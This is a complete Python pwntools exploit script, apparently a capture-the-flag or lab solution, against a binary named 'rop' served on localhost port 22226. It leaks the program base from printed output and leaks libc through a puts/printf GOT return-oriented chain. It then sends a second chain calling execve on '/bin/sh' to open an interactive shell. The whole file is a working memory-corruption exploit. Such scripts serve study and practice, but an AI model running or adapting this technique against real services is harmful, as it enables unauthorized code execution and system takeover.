#!/usr/bin/env python3

from pwn import *
import binascii
import os

exe = context.binary = ELF("rop")

if args.REMOTE:
    libc = ELF("./libc-docker.so")
else:
    libc = ELF("/usr/lib/libc.so.6")

remotehost = ("127.0.0.1", 22226)

context.binary = exe.path
context.terminal = ['st', '-e', 'sh', '-c']

gdbscript = '''
b *main
continue
'''.format(**locals())


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


#################################################################

rip_offset = 264

io = start()

main_addr = int(io.readline(False).split(b":")[1], 0)
exe.address = main_addr - exe.sym.main

log.info("exe base address: %x" % (exe.address, ))

R = ROP(exe)

R.call(exe.sym.puts, [exe.got.printf])
R.call(exe.sym.main)

log.info("puts(printf@plt):\n %s" % R.dump())

payload = fit({rip_offset: R.chain()})

io.recvline()
io.sendline(payload)
io.recvline()

printf_libc = u64(io.readline(False).ljust(8, b'\x00'))

libc.address = printf_libc - libc.sym.printf

log.info("libc base address: %x" % (libc.address))

R = ROP([exe, libc])

bin_sh = next(libc.search(b"/bin/sh"))

R.call(libc.sym.execve, [bin_sh, 0, 0])

log.info("execeve(\"/bin/sh\"):\n %s" % R.dump())

payload = fit({rip_offset: R.chain()})

io.recvline()
io.recvline()
io.sendline(payload)
io.recvline()

io.interactive()